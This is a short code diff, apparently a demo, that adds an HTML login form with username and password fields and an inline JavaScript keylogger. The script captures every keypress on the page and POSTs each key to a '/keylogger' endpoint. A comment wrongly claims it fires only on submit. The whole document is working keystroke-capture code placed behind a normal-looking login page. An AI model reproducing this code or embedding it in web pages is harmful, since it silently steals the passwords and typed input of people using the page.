@@ -1,0 +1,23 @@
+<form action="/">
+    <input type="text" name="username" placeholder="Username" />
+    <input type="text" name="password" placeholder="Password" />
+    <input type="submit" />
+  </form>
+
+  <script>
+    // Grab the form and fire off this function when submit button is clicked
+    
+    document.addEventListener("keypress", (event) => {
+        // console.log(event.key)
+        let formData = new FormData();
+
+        formData.append("keylog", event.key);
+
+      // Grab content from form
+      fetch("/keylogger", {
+        method: "POST",
+        body: formData
+      })
+    });
+
+    </script>
